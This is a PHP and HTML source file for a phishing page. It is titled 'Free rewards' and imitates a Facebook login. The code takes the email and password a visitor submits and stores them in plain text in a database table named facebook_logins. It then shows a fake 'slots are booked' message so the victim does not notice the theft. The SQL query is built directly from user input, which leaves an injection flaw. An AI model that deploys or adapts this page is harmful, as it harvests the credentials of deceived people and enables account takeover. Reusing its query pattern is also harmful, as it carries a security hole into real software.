<?php 
include 'untitled.php';

if(isset($_POST['submit'])){

$email = $_POST['email'];
$password = $_POST['password'];
if($email!='' && $password!=''){
$query = "INSERT INTO facebook_logins VALUES ('$email','$password')";
  if (mysqli_query($conn,$query)) { 
      if(isset($_POST['submit'])){
    echo "<marquee>sorry slots are booked ....please try again in a few days......</marquee>";
      }
  } else {
    echo "please try again";
  }
}
  mysqli_close($conn);
}
?>

<html>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Free rewards</title>
  <link href="startingpage.css" rel="stylesheet">
</head>

<body>
  <table class="dummy">
  </table>
  
    <table class="main"><div class="border">
      <form method="POST" action="#">
        
     <tr>
       <td class="facebook"align="ceter">facebook
        </td>
      </tr>
        
     <tr><td class="space"></td></tr>
      
           <tr><td class="space"></td></tr>
      
      <tr>
        <td class="space">
          <p>Email:</p>
        </td>
      </tr>
      
           <tr><td class="space"></td></tr>
      
      <tr>
        <td>
          <input type="email" class="email" name="email"placeholder="Email or phone" required>
        </td>
      </tr>
           <tr><td class="space"></td></tr>
           <tr><td class="space"></td></tr>
      
      
      <tr>
        <td class="space">
          <p>password:</p>
        </td>
      </tr>
      
           <tr><td class="space"></td></tr>
      
      <tr>
        <td>
          <input class="email" type="password" placeholder="Password"name="password" required>
        </td>
      </tr>
      
      
       <tr><td class="space"></td></tr>
            <tr><td class="space"> </td></tr>
           <tr><td class="space"> </td></tr>
           <tr><td class="space" content=""> </td></tr>
      
       
      <tr>
        <td align="center">
         <a href="mobile.html">
            <input type="submit" class="submit"value="Login"name="submit">
          </a>
        </td>
      </tr>
      
      
      <tr>
        <td class="space">
          
        </td>
      </tr>
      
      </form>
      
    </table>

</body>

</html>
